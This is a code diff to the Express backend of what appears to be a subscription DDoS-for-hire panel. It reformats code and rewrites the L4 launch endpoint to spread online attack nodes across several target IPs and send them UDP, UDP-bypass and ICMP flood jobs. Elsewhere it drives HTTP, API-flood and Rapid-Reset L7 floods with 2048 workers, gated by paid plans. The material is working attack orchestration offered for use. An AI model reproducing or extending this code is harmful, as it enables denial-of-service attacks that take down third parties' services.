@@ -7,9 +7,10 @@ const app = express();
 app.use(express.json());
 app.set("trust proxy", true);
 
-const SUPABASE_URL         = process.env.VITE_SUPABASE_URL || "https://fyzbqbubsdkjrmppkdsl.supabase.co";
+const SUPABASE_URL =
+  process.env.VITE_SUPABASE_URL || "https://fyzbqbubsdkjrmppkdsl.supabase.co";
 const SUPABASE_SERVICE_KEY = process.env.VITE_SUPABASE_SERVICE_KEY;
-const SESSION_SECRET       = process.env.SESSION_SECRET;
+const SESSION_SECRET = process.env.SESSION_SECRET;
 
 if (!SUPABASE_SERVICE_KEY) {
   console.error("[proxy] FATAL: VITE_SUPABASE_SERVICE_KEY is not set.");
@@ -25,7 +26,12 @@ const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
 });
 
 const L4_METHODS = new Set(["UDP-NORMAL", "UDP-BYPASS", "ICMP"]);
-const L7_METHODS = new Set(["HTTP-GET", "HTTP-POST", "API-FLOOD", "RAPID-RESET"]);
+const L7_METHODS = new Set([
+  "HTTP-GET",
+  "HTTP-POST",
+  "API-FLOOD",
+  "RAPID-RESET",
+]);
 
 // ── HMAC launch tokens (anti-replay, serverless-compatible) ───────────────────
 // Stateless: no in-memory store needed, works across serverless instances.
@@ -35,24 +41,28 @@ const TOKEN_TTL_MS = 30_000;
 
 function generateLaunchToken(userId) {
   const data = `${userId}|${Date.now()}`;
-  const sig  = createHmac("sha256", SESSION_SECRET).update(data).digest("hex");
+  const sig = createHmac("sha256", SESSION_SECRET).update(data).digest("hex");
   return Buffer.from(`${data}|${sig}`).toString("base64url");
 }
 
 function consumeLaunchToken(rawToken, userId) {
-  if (!rawToken) return { ok: false, reason: "Missing launch token — request one first" };
+  if (!rawToken)
+    return { ok: false, reason: "Missing launch token — request one first" };
   try {
     const decoded = Buffer.from(rawToken, "base64url").toString("utf8");
     const lastBar = decoded.lastIndexOf("|");
     if (lastBar === -1) return { ok: false, reason: "Malformed launch token" };
-    const sig  = decoded.slice(lastBar + 1);
+    const sig = decoded.slice(lastBar + 1);
     const data = decoded.slice(0, lastBar);
     const [tokenUserId, tsStr] = data.split("|");
-    if (!tokenUserId || !tsStr) return { ok: false, reason: "Malformed launch token" };
+    if (!tokenUserId || !tsStr)
+      return { ok: false, reason: "Malformed launch token" };
 
     // Timing-safe HMAC verification (prevents timing attacks)
-    const expectedSig = createHmac("sha256", SESSION_SECRET).update(data).digest("hex");
-    const sBuf = Buffer.from(sig,         "hex");
+    const expectedSig = createHmac("sha256", SESSION_SECRET)
+      .update(data)
+      .digest("hex");
+    const sBuf = Buffer.from(sig, "hex");
     const eBuf = Buffer.from(expectedSig, "hex");
     if (sBuf.length !== eBuf.length || !timingSafeEqual(sBuf, eBuf))
       return { ok: false, reason: "Invalid launch token" };
@@ -63,7 +73,8 @@ function consumeLaunchToken(rawToken, userId) {
       return { ok: false, reason: "Launch token expired — request a new one" };
 
     // User binding
-    if (tokenUserId !== userId) return { ok: false, reason: "Launch token user mismatch" };
+    if (tokenUserId !== userId)
+      return { ok: false, reason: "Launch token user mismatch" };
 
     return { ok: true };
   } catch {
@@ -91,19 +102,31 @@ async function requireAuth(req, res, next) {
   const token = req.headers.authorization?.replace("Bearer ", "");
   if (!token) return res.status(401).json({ error: "Unauthorized" });
 
-  const { data: { user }, error: authErr } = await supabaseAdmin.auth.getUser(token);
+  const {
+    data: { user },
+    error: authErr,
+  } = await supabaseAdmin.auth.getUser(token);
   if (authErr || !user) return res.status(401).json({ error: "Unauthorized" });
 
   const { data: profile, error: profileErr } = await supabaseAdmin
     .from("profiles")
-    .select("id, is_admin, is_suspended, plan_id, plan:plans(id, name, methods, access_layers, max_duration, max_daily_runs)")
+    .select(
+      "id, is_admin, is_suspended, plan_id, plan:plans(id, name, methods, access_layers, max_duration, max_daily_runs)",
+    )
     .eq("id", user.id)
     .single();
 
-  if (profileErr || !profile) return res.status(403).json({ error: profileErr?.message ?? "Profile not found" });
-  if (await isIpLockEnabled() && profile.is_suspended && !profile.is_admin) return res.status(403).json({ error: "This account is suspended. Contact an administrator.", code: "ACCOUNT_SUSPENDED" });
+  if (profileErr || !profile)
+    return res
+      .status(403)
+      .json({ error: profileErr?.message ?? "Profile not found" });
+  if ((await isIpLockEnabled()) && profile.is_suspended && !profile.is_admin)
+    return res.status(403).json({
+      error: "This account is suspended. Contact an administrator.",
+      code: "ACCOUNT_SUSPENDED",
+    });
 
-  req.user    = user;
+  req.user = user;
   req.profile = profile;
   req.isAdmin = !!profile.is_admin;
   next();
@@ -111,47 +134,83 @@ async function requireAuth(req, res, next) {
 
 // ── Admin-only guard (must run after requireAuth) ─────────────────────────────
 function requireAdmin(req, res, next) {
-  if (!req.isAdmin) return res.status(403).json({ error: "Admin access required" });
+  if (!req.isAdmin)
+    return res.status(403).json({ error: "Admin access required" });
   next();
 }
 
 // ── Single-login IP lock ──────────────────────────────────────────────────────
 function getClientIp(req) {
   const forwarded = req.headers["x-forwarded-for"];
-  const raw = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.ip || (typeof forwarded === "string" ? forwarded.split(",")[0] : "") || req.socket.remoteAddress || "";
-  return String(raw).trim().replace(/^::ffff:/, "");
+  const raw =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-real-ip"] ||
+    req.ip ||
+    (typeof forwarded === "string" ? forwarded.split(",")[0] : "") ||
+    req.socket.remoteAddress ||
+    "";
+  return String(raw)
+    .trim()
+    .replace(/^::ffff:/, "");
 }
 
 // Called immediately after password authentication. The first IP is trusted;
 // a later login from another IP suspends the account until an admin unlocks it.
 app.post("/proxy/security/check-login", requireAuth, async (req, res) => {
-  if (!(await isIpLockEnabled())) return res.json({ ok: true, enforcementEnabled: false });
+  if (!(await isIpLockEnabled()))
+    return res.json({ ok: true, enforcementEnabled: false });
 
   const ip = getClientIp(req);
-  if (!ip || ip === "unknown") return res.status(503).json({ error: "Could not determine the login network. Try again." });
+  if (!ip || ip === "unknown")
+    return res
+      .status(503)
+      .json({ error: "Could not determine the login network. Try again." });
 
   const { data: profile, error: profileErr } = await supabaseAdmin
     .from("profiles")
     .select("login_ip, is_suspended")
     .eq("id", req.user.id)
     .single();
-  if (profileErr || !profile) return res.status(500).json({ error: "Could not verify account security." });
-  if (profile.is_suspended) return res.status(403).json({ error: "This account is suspended. Contact an administrator.", code: "ACCOUNT_SUSPENDED" });
+  if (profileErr || !profile)
+    return res
+      .status(500)
+      .json({ error: "Could not verify account security." });
+  if (profile.is_suspended)
+    return res.status(403).json({
+      error: "This account is suspended. Contact an administrator.",
+      code: "ACCOUNT_SUSPENDED",
+    });
 
   if (!profile.login_ip) {
-    const { error } = await supabaseAdmin.from("profiles").update({ login_ip: ip }).eq("id", req.user.id);
-    if (error) return res.status(500).json({ error: "Could not save the login network." });
+    const { error } = await supabaseAdmin
+      .from("profiles")
+      .update({ login_ip: ip })
+      .eq("id", req.user.id);
+    if (error)
+      return res
+        .status(500)
+        .json({ error: "Could not save the login network." });
     return res.json({ ok: true, firstLogin: true });
   }
 
   if (profile.login_ip !== ip) {
-    const { error } = await supabaseAdmin.from("profiles").update({
-      is_suspended: true,
-      suspended_at: new Date().toISOString(),
-      suspended_reason: "Login from an unrecognized IP address",
-    }).eq("id", req.user.id);
-    if (error) return res.status(500).json({ error: "Could not suspend the account safely." });
-    return res.status(403).json({ error: "This account was suspended because it was accessed from a different network.", code: "ACCOUNT_SUSPENDED" });
+    const { error } = await supabaseAdmin
+      .from("profiles")
+      .update({
+        is_suspended: true,
+        suspended_at: new Date().toISOString(),
+        suspended_reason: "Login from an unrecognized IP address",
+      })
+      .eq("id", req.user.id);
+    if (error)
+      return res
+        .status(500)
+        .json({ error: "Could not suspend the account safely." });
+    return res.status(403).json({
+      error:
+        "This account was suspended because it was accessed from a different network.",
+      code: "ACCOUNT_SUSPENDED",
+    });
   }
 
   return res.json({ ok: true, firstLogin: false });
@@ -179,15 +238,32 @@ async function checkPolicy(req, layer, method, duration) {
   const { isAdmin, profile } = req;
   const plan = profile.plan;
 
-  if (!isAdmin && !plan) return { ok: false, status: 403, error: "No plan assigned to your account" };
+  if (!isAdmin && !plan)
+    return {
+      ok: false,
+      status: 403,
+      error: "No plan assigned to your account",
+    };
 
   if (!isAdmin) {
     if (!plan.access_layers?.includes(layer))
-      return { ok: false, status: 403, error: `Your plan does not include ${layer} access` };
+      return {
+        ok: false,
+        status: 403,
+        error: `Your plan does not include ${layer} access`,
+      };
     if (!plan.methods?.includes(method))
-      return { ok: false, status: 403, error: `Your plan does not include the ${method} method` };
+      return {
+        ok: false,
+        status: 403,
+        error: `Your plan does not include the ${method} method`,
+      };
     if (plan.max_duration > 0 && duration > plan.max_duration)
-      return { ok: false, status: 403, error: `Duration ${duration}s exceeds your plan limit of ${plan.max_duration}s` };
+      return {
+        ok: false,
+        status: 403,
+        error: `Duration ${duration}s exceeds your plan limit of ${plan.max_duration}s`,
+      };
     if (plan.max_daily_runs > 0) {
       const startOfDay = new Date();
       startOfDay.setHours(0, 0, 0, 0);
@@ -198,14 +274,28 @@ async function checkPolicy(req, layer, method, duration) {
         .eq("user_id", req.user.id)
         .gte("created_at", startOfDay.toISOString());
       if ((count ?? 0) >= plan.max_daily_runs)
-        return { ok: false, status: 429, error: `Daily limit reached (${plan.max_daily_runs} runs/day). Resets at midnight.` };
+        return {
+          ok: false,
+          status: 429,
+          error: `Daily limit reached (${plan.max_daily_runs} runs/day). Resets at midnight.`,
+        };
     }
   }
 
   const rpcName = layer === "L4" ? "is_l4_busy" : "is_l7_busy";
   const { data: busy, error: rpcErr } = await supabaseAdmin.rpc(rpcName);
-  if (rpcErr) return { ok: false, status: 500, error: `Could not check busy state: ${rpcErr.message}` };
-  if (busy) return { ok: false, status: 409, error: `An ${layer} attack is already running. Wait for it to finish.` };
+  if (rpcErr)
+    return {
+      ok: false,
+      status: 500,
+      error: `Could not check busy state: ${rpcErr.message}`,
+    };
+  if (busy)
+    return {
+      ok: false,
+      status: 409,
+      error: `An ${layer} attack is already running. Wait for it to finish.`,
+    };
 
   return { ok: true };
 }
@@ -229,11 +319,15 @@ async function checkNodeAvailability(url) {
   const startedAt = Date.now();
 
   try {
-    const response = await fetchWithTimeout(healthUrl, {
-      method: "GET",
-      headers: { Accept: "application/json, text/plain;q=0.9" },
-      redirect: "manual",
-    }, 5000);
+    const response = await fetchWithTimeout(
+      healthUrl,
+      {
+        method: "GET",
+        headers: { Accept: "application/json, text/plain;q=0.9" },
+        redirect: "manual",
+      },
+      5000,
+    );
 
     response.body?.cancel();
     const online = response.ok;
@@ -242,7 +336,9 @@ async function checkNodeAvailability(url) {
       statusCode: response.status,
       responseTime: Date.now() - startedAt,
       checkUrl: response.url || healthUrl,
-      error: online ? null : `Health check HTTP ${response.status} ${response.statusText}`,
+      error: online
+        ? null
+        : `Health check HTTP ${response.status} ${response.statusText}`,
     };
   } catch (err) {
     return {
@@ -256,13 +352,20 @@ async function checkNodeAvailability(url) {
 }
 
 function normalizeTargetList(value) {
-  const rawTargets = Array.isArray(value) ? value : String(value ?? "").split(",");
-  return [...new Set(rawTargets.map((target) => String(target).trim()).filter(Boolean))];
+  const rawTargets = Array.isArray(value)
+    ? value
+    : String(value ?? "").split(",");
+  return [
+    ...new Set(
+      rawTargets.map((target) => String(target).trim()).filter(Boolean),
+    ),
+  ];
 }
 
 function validateTargetList(targets) {
   if (!targets.length) return "Enter at least one IP address";
-  if (targets.length > 64) return "You can process up to 64 IP addresses at a time";
+  if (targets.length > 64)
+    return "You can process up to 64 IP addresses at a time";
 
   const invalidTargets = targets.filter((target) => !isIP(target));
   if (invalidTargets.length) {
@@ -288,7 +391,7 @@ async function allocateHealthyL4Nodes(targets) {
     configuredNodes.map(async (node) => ({
       ...node,
       ...(await checkNodeAvailability(node.url)),
-    }))
+    })),
   );
   const onlineNodes = nodeStatuses.filter((node) => node.online);
   const baseCount = Math.floor(onlineNodes.length / targets.length);
@@ -297,10 +400,12 @@ async function allocateHealthyL4Nodes(targets) {
 
   const assignments = targets.map((target, targetIndex) => {
     const count = baseCount + (targetIndex < remainder ? 1 : 0);
-    const assignedNodes = onlineNodes.slice(nodeIndex, nodeIndex + count).map((node) => ({
-      ...node,
-      target,
-    }));
+    const assignedNodes = onlineNodes
+      .slice(nodeIndex, nodeIndex + count)
+      .map((node) => ({
+        ...node,
+        target,
+      }));
     nodeIndex += count;
     return { target, nodes: assignedNodes };
   });
@@ -321,18 +426,23 @@ async function runMultiTargetDryRun(assignments) {
             statusCode: status.statusCode,
             error: status.error,
           };
-        })
+        }),
       );
-      const successfulNodes = nodeResponses.filter((node) => node.status === "online").length;
+      const successfulNodes = nodeResponses.filter(
+        (node) => node.status === "online",
+      ).length;
 
       return {
         target,
         assignedNodes: nodes.map((node) => node.id),
         status: successfulNodes > 0 ? "success" : "failed",
         nodeResponses,
-        error: successfulNodes > 0 ? null : "No assigned node responded to the health check",
+        error:
+          successfulNodes > 0
+            ? null
+            : "No assigned node responded to the health check",
       };
-    })
+    }),
   );
 }
 
@@ -352,23 +462,28 @@ app.post("/proxy/l7/start", requireAuth, async (req, res) => {
     return res.status(400).json({ error: "Invalid duration" });
 
   const policy = await checkPolicy(req, "L7", method, dur);
-  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });
+  if (!policy.ok)
+    return res.status(policy.status).json({ error: policy.error });
 
-  const { data: apis, error } = await supabaseAdmin.from("layer7_apis").select("url");
+  const { data: apis, error } = await supabaseAdmin
+    .from("layer7_apis")
+    .select("url");
   if (error) return res.status(500).json({ error: "Failed to fetch L7 nodes" });
   if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });
 
   const body = {
-    target:     target.trim(),
-    method:     method.toLowerCase().replace(/-/g, ""),
-    duration:   dur,
-    workers:    2048,
-    verbose:    false,
+    target: target.trim(),
+    method: method.toLowerCase().replace(/-/g, ""),
+    duration: dur,
+    workers: 2048,
+    verbose: false,
     rate_delay: 0,
   };
 
   await Promise.allSettled(
-    apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
+    apis.map((api) =>
+      fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}),
+    ),
   );
   await new Promise((r) => setTimeout(r, 500));
 
@@ -384,13 +499,20 @@ app.post("/proxy/l7/start", requireAuth, async (req, res) => {
         const data = await r.json();
         return { success: true, data };
       } catch (err) {
-        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
+        return {
+          success: false,
+          error: err.name === "AbortError" ? "timed out (15 s)" : err.message,
+        };
       }
-    })
+    }),
   );
 
-  const results = settled.map((s) => s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) });
-  const online  = results.filter((r) => r.success).length;
+  const results = settled.map((s) =>
+    s.status === "fulfilled"
+      ? s.value
+      : { success: false, error: s.reason?.message ?? String(s.reason) },
+  );
+  const online = results.filter((r) => r.success).length;
   res.json({ total: apis.length, online, results });
 });
 
@@ -403,13 +525,16 @@ app.post("/proxy/l7/stop", requireAuth, async (req, res) => {
       .select("id", { count: "exact", head: true })
       .eq("user_id", req.user.id)
       .eq("status", "running");
-    if (!count) return res.status(403).json({ error: "No active L7 attack to stop" });
+    if (!count)
+      return res.status(403).json({ error: "No active L7 attack to stop" });
   }
 
   const { data: apis } = await supabaseAdmin.from("layer7_apis").select("url");
   if (apis?.length) {
     await Promise.allSettled(
-      apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}))
+      apis.map((api) =>
+        fetch(`${api.url}/api/attack/stop`, { method: "POST" }).catch(() => {}),
+      ),
     );
   }
   res.json({ ok: true });
@@ -424,13 +549,21 @@ app.post("/proxy/l4/allocation-preview", requireAuth, async (req, res) => {
   if (validationError) return res.status(400).json({ error: validationError });
 
   const allocation = await allocateHealthyL4Nodes(targets);
-  if (allocation.error) return res.status(500).json({ error: allocation.error });
-  const { configuredNodes, nodeStatuses, onlineNodes, assignments } = allocation;
+  if (allocation.error)
+    return res.status(500).json({ error: allocation.error });
+  const { configuredNodes, nodeStatuses, onlineNodes, assignments } =
+    allocation;
 
-  console.log(`[allocation-preview] user=${req.user.id} targets=${targets.length} configuredNodes=${configuredNodes.length} onlineNodes=${onlineNodes.length}`);
-  nodeStatuses.filter((node) => !node.online).forEach((node) => {
-    console.log(`[allocation-preview] offline ${node.id} (${node.url}) -> ${node.error}`);
-  });
+  console.log(
+    `[allocation-preview] user=${req.user.id} targets=${targets.length} configuredNodes=${configuredNodes.length} onlineNodes=${onlineNodes.length}`,
+  );
+  nodeStatuses
+    .filter((node) => !node.online)
+    .forEach((node) => {
+      console.log(
+        `[allocation-preview] offline ${node.id} (${node.url}) -> ${node.error}`,
+      );
+    });
   assignments.forEach(({ target, nodes: assignedNodes }) => {
     if (!assignedNodes.length) {
       console.log(`[allocation-preview] target=${target} -> no node assigned`);
@@ -448,32 +581,50 @@ app.post("/proxy/l4/allocation-preview", requireAuth, async (req, res) => {
     onlineNodeCount: onlineNodes.length,
     offlineNodeCount: configuredNodes.length - onlineNodes.length,
     nodeCount: onlineNodes.length,
-    nodeStatuses: nodeStatuses.map(({ id, url, online, statusCode, responseTime, error }) => ({
-      id,
-      url,
-      online,
-      statusCode,
-      responseTime,
-      error,
-    })),
+    nodeStatuses: nodeStatuses.map(
+      ({ id, url, online, statusCode, responseTime, error }) => ({
+        id,
+        url,
+        online,
+        statusCode,
+        responseTime,
+        error,
+      }),
+    ),
     assignments,
   });
 });
 
 app.post("/proxy/l4/start", requireAuth, async (req, res) => {
   const { target, port, method, duration, launch_token } = req.body;
-  const targets = normalizeTargetList(target);
 
   const tok = consumeLaunchToken(launch_token, req.user.id);
   if (!tok.ok) return res.status(403).json({ error: tok.reason });
 
-  if (Array.isArray(target) ? !targets.length : (!target || typeof target !== "string" || !target.trim()))
-    return res.status(400).json({ error: "Invalid target" });
+  // Parse multiple targets
+  const targets = target
+    .split(",")
+    .map((t) => t.trim())
+    .filter(Boolean);
+  if (!targets.length)
+    return res.status(400).json({ error: "Invalid target(s)" });
+
+  const isMultiTarget = targets.length > 1;
+
+  const invalidTargets = targets.filter((t) => !isIP(t));
+  if (invalidTargets.length) {
+    return res.status(400).json({
+      error: `Invalid IP address${invalidTargets.length === 1 ? "" : "es"}: ${invalidTargets.join(", ")}`,
+    });
+  }
+
   if (!L4_METHODS.has(method))
     return res.status(400).json({ error: `Invalid L4 method: ${method}` });
+
   const dur = parseInt(duration, 10);
   if (!dur || dur < 1)
     return res.status(400).json({ error: "Invalid duration" });
+
   if (method === "UDP-NORMAL") {
     const p = parseInt(port, 10);
     if (!p || p < 1 || p > 65535)
@@ -481,79 +632,150 @@ app.post("/proxy/l4/start", requireAuth, async (req, res) => {
   }
 
   const policy = await checkPolicy(req, "L4", method, dur);
-  if (!policy.ok) return res.status(policy.status).json({ error: policy.error });
+  if (!policy.ok)
+    return res.status(policy.status).json({ error: policy.error });
 
-  if (targets.length > 1) {
-    const validationError = validateTargetList(targets);
-    if (validationError) return res.status(400).json({ error: validationError });
-
-    const allocation = await allocateHealthyL4Nodes(targets);
-    if (allocation.error) return res.status(500).json({ error: allocation.error });
-
-    const allocations = await runMultiTargetDryRun(allocation.assignments);
-    const successfulTargets = allocations.filter((item) => item.status === "success").length;
-    const failedTargets = allocations.length - successfulTargets;
-
-    console.log(
-      `[multi-target-dry-run] user=${req.user.id} targets=${targets.length} ` +
-      `configuredNodes=${allocation.configuredNodes.length} onlineNodes=${allocation.onlineNodes.length}`
-    );
-    allocations.forEach((item) => {
-      console.log(
-        `[multi-target-dry-run] target=${item.target} ` +
-        `assigned=${item.assignedNodes.join(",") || "none"} status=${item.status}`
-      );
-    });
-
-    return res.json({
-      success: true,
-      mode: "multi_target",
-      dryRun: true,
-      totalTargets: targets.length,
-      successfulTargets,
-      failedTargets,
-      onlineNodes: allocation.onlineNodes.length,
-      totalNodes: allocation.configuredNodes.length,
-      allocations,
-    });
-  }
-
-  const { data: apis, error } = await supabaseAdmin.from("layer4_apis").select("url");
+  const { data: apis, error } = await supabaseAdmin
+    .from("layer4_apis")
+    .select("url");
   if (error) return res.status(500).json({ error: "Failed to fetch L4 nodes" });
   if (!apis?.length) return res.json({ total: 0, online: 0, results: [] });
 
-  const singleTarget = targets[0] || target.trim();
-  let body;
-  if (method === "UDP-NORMAL") {
-    body = { method: 1, ip: singleTarget, port: parseInt(port, 10), duration: dur };
-  } else if (method === "UDP-BYPASS") {
-    body = { method: 2, ip: singleTarget, time: dur };
-  } else {
-    // ICMP
-    body = { method: 3, ip: singleTarget, duration: dur };
-  }
-
-  const settled = await Promise.allSettled(
-    apis.map(async (api) => {
-      try {
-        const r = await fetchWithTimeout(`${api.url}/api/hit`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(body),
-        });
-        if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
-        const data = await r.json();
-        if (!data?.instance_id) throw new Error("No instance_id in response");
-        return { success: true, instance_id: data.instance_id };
-      } catch (err) {
-        return { success: false, error: err.name === "AbortError" ? "timed out (15 s)" : err.message };
-      }
-    })
+  const nodeStatuses = await Promise.all(
+    apis.map(async (api) => ({
+      url: api.url,
+      online: await checkNodeAvailability(api.url).then((r) => r.online),
+    })),
   );
 
-  const results = settled.map((s) => s.status === "fulfilled" ? s.value : { success: false, error: s.reason?.message ?? String(s.reason) });
-  const online  = results.filter((r) => r.success).length;
-  res.json({ total: apis.length, online, results });
+  const onlineNodes = nodeStatuses.filter((n) => n.online);
+  if (!onlineNodes.length) {
+    return res.status(503).json({ error: "No online nodes available" });
+  }
+
+  let assignments;
+
+  if (isMultiTarget) {
+    const baseCount = Math.floor(onlineNodes.length / targets.length);
+    const remainder = onlineNodes.length % targets.length;
+    let nodeIndex = 0;
+
+    assignments = targets.map((targetIp, index) => {
+      const count = baseCount + (index < remainder ? 1 : 0);
+      const assignedNodes = onlineNodes.slice(nodeIndex, nodeIndex + count);
+      nodeIndex += count;
+      return { target: targetIp, nodes: assignedNodes };
+    });
+  } else {
+    assignments = [{ target: targets[0], nodes: onlineNodes }];
+  }
+
+  let bodyTemplate;
+  if (method === "UDP-NORMAL") {
+    bodyTemplate = { method: 1, port: parseInt(port, 10), duration: dur };
+  } else if (method === "UDP-BYPASS") {
+    bodyTemplate = { method: 2, time: dur };
+  } else {
+    bodyTemplate = { method: 3, duration: dur };
+  }
+
+  const results = [];
+
+  for (const assignment of assignments) {
+    const { target: targetIp, nodes: assignedNodes } = assignment;
+
+    if (!assignedNodes.length) {
+      results.push({
+        target: targetIp,
+        success: false,
+        error: "No nodes assigned",
+        nodeCount: 0,
+      });
+      continue;
+    }
+
+    const attackBody = {
+      ...bodyTemplate,
+      ip: targetIp,
+    };
+
+    const nodeResults = await Promise.allSettled(
+      assignedNodes.map(async (node) => {
+        try {
+          const r = await fetchWithTimeout(`${node.url}/api/hit`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(attackBody),
+          });
+          if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
+          const data = await r.json();
+          if (!data?.instance_id) throw new Error("No instance_id in response");
+          return {
+            success: true,
+            instance_id: data.instance_id,
+            node: node.url,
+          };
+        } catch (err) {
+          return {
+            success: false,
+            error: err.name === "AbortError" ? "timed out (15 s)" : err.message,
+            node: node.url,
+          };
+        }
+      }),
+    );
+
+    const successfulNodes = nodeResults.filter(
+      (r) => r.status === "fulfilled" && r.value.success,
+    );
+    results.push({
+      target: targetIp,
+      success: successfulNodes.length > 0,
+      nodeCount: assignedNodes.length,
+      successfulNodes: successfulNodes.length,
+      results: nodeResults.map((r) =>
+        r.status === "fulfilled"
+          ? r.value
+          : { success: false, error: r.reason?.message ?? String(r.reason) },
+      ),
+    });
+  }
+
+  const table = "l4_runs";
+  const runRecords = results.map((result) => ({
+    user_id: req.user.id,
+    target: result.target,
+    method,
+    duration,
+    status: result.success ? "running" : "failed",
+    started_at: new Date().toISOString(),
+  }));
+
+  const { error: insertError } = await supabaseAdmin
+    .from(table)
+    .insert(runRecords);
+
+  if (insertError) {
+    console.error("[proxy] Failed to insert runs:", insertError.message);
+  }
+
+  const totalTargets = targets.length;
+  const successfulTargets = results.filter((r) => r.success).length;
+
+  res.json({
+    success: true,
+    totalTargets,
+    successfulTargets,
+    failedTargets: totalTargets - successfulTargets,
+    onlineNodes: onlineNodes.length,
+    totalNodes: apis.length,
+    assignments: assignments.map((a) => ({
+      target: a.target,
+      nodeCount: a.nodes.length,
+      nodes: a.nodes.map((n) => n.url),
+    })),
+    results,
+  });
 });
 
 // ── POST /proxy/l4/stop ───────────────────────────────────────────────────────
@@ -564,13 +786,16 @@ app.post("/proxy/l4/stop", requireAuth, async (req, res) => {
       .select("id", { count: "exact", head: true })
       .eq("user_id", req.user.id)
       .eq("status", "running");
-    if (!count) return res.status(403).json({ error: "No active L4 attack to stop" });
+    if (!count)
+      return res.status(403).json({ error: "No active L4 attack to stop" });
   }
 
   const { data: apis } = await supabaseAdmin.from("layer4_apis").select("url");
   if (apis?.length) {
     await Promise.allSettled(
-      apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }).catch(() => {}))
+      apis.map((api) =>
+        fetch(`${api.url}/api/stop/all`, { method: "POST" }).catch(() => {}),
+      ),
     );
   }
   res.json({ ok: true });
@@ -578,51 +803,76 @@ app.post("/proxy/l4/stop", requireAuth, async (req, res) => {
 
 // ── Admin: activity log ───────────────────────────────────────────────────────
 // GET /proxy/admin/activity
-app.get("/proxy/admin/activity", requireAuth, requireAdmin, async (req, res) => {
-  const [{ data: l4Data, error: e1 }, { data: l7Data, error: e2 }] = await Promise.all([
-    supabaseAdmin
-      .from("l4_runs")
-      .select("*, profile:profiles(full_name, email)")
-      .order("created_at", { ascending: false })
-      .limit(500),
-    supabaseAdmin
-      .from("l7_runs")
-      .select("*, profile:profiles(full_name, email)")
-      .order("created_at", { ascending: false })
-      .limit(500),
-  ]);
-  if (e1 || e2) return res.status(500).json({ error: (e1 || e2).message });
-  const combined = [
-    ...(l4Data || []).map((r) => ({ ...r, layer: "L4" })),
-    ...(l7Data || []).map((r) => ({ ...r, layer: "L7" })),
-  ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
-  res.json({ runs: combined });
-});
+app.get(
+  "/proxy/admin/activity",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const [{ data: l4Data, error: e1 }, { data: l7Data, error: e2 }] =
+      await Promise.all([
+        supabaseAdmin
+          .from("l4_runs")
+          .select("*, profile:profiles(full_name, email)")
+          .order("created_at", { ascending: false })
+          .limit(500),
+        supabaseAdmin
+          .from("l7_runs")
+          .select("*, profile:profiles(full_name, email)")
+          .order("created_at", { ascending: false })
+          .limit(500),
+      ]);
+    if (e1 || e2) return res.status(500).json({ error: (e1 || e2).message });
+    const combined = [
+      ...(l4Data || []).map((r) => ({ ...r, layer: "L4" })),
+      ...(l7Data || []).map((r) => ({ ...r, layer: "L7" })),
+    ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
+    res.json({ runs: combined });
+  },
+);
 
 // ── Admin: user management endpoints ─────────────────────────────────────────
 
 // GET/PATCH /proxy/admin/security-settings — global IP lock switch
-app.get("/proxy/admin/security-settings", requireAuth, requireAdmin, async (req, res) => {
-  const { data, error } = await supabaseAdmin
-    .from("security_settings")
-    .select("ip_lock_enabled, updated_at")
-    .eq("id", 1)
-    .maybeSingle();
-  if (error) return res.status(500).json({ error: error.message });
-  res.json({ ip_lock_enabled: data?.ip_lock_enabled === true, updated_at: data?.updated_at ?? null });
-});
+app.get(
+  "/proxy/admin/security-settings",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const { data, error } = await supabaseAdmin
+      .from("security_settings")
+      .select("ip_lock_enabled, updated_at")
+      .eq("id", 1)
+      .maybeSingle();
+    if (error) return res.status(500).json({ error: error.message });
+    res.json({
+      ip_lock_enabled: data?.ip_lock_enabled === true,
+      updated_at: data?.updated_at ?? null,
+    });
+  },
+);
 
-app.patch("/proxy/admin/security-settings", requireAuth, requireAdmin, async (req, res) => {
-  const { ip_lock_enabled } = req.body;
-  if (typeof ip_lock_enabled !== "boolean") return res.status(400).json({ error: "ip_lock_enabled must be a boolean" });
-  const { data, error } = await supabaseAdmin
-    .from("security_settings")
-    .upsert({ id: 1, ip_lock_enabled, updated_at: new Date().toISOString() }, { onConflict: "id" })
-    .select("ip_lock_enabled, updated_at")
-    .single();
-  if (error) return res.status(400).json({ error: error.message });
-  res.json(data);
-});
+app.patch(
+  "/proxy/admin/security-settings",
+  requireAuth,
+  requireAdmin,
+  async (req, res) => {
+    const { ip_lock_enabled } = req.body;
+    if (typeof ip_lock_enabled !== "boolean")
+      return res
+        .status(400)
+        .json({ error: "ip_lock_enabled must be a boolean" });
+    const { data, error } = await supabaseAdmin
+      .from("security_settings")
+      .upsert(
+        { id: 1, ip_lock_enabled, updated_at: new Date().toISOString() },
+        { onConflict: "id" },
+      )
+      .select("ip_lock_enabled, updated_at")
+      .single();
+    if (error) return res.status(400).json({ error: error.message });
+    res.json(data);
+  },
+);
 
 // GET /proxy/admin/users
 app.get("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
@@ -632,20 +882,30 @@ app.get("/proxy/admin/users", requireAuth, requireAdmin, async (req, res) => {
   const users = data.users || [];
   const ids = users.map((user) => user.id);
   const { data: securityRows, error: securityError } = ids.length
-    ? await supabaseAdmin.from("profiles").select("id, is_suspended, login_ip, suspended_at, suspended_reason").in("id", ids)
+    ? await supabaseAdmin
+        .from("profiles")
+        .select("id, is_suspended, login_ip, suspended_at, suspended_reason")
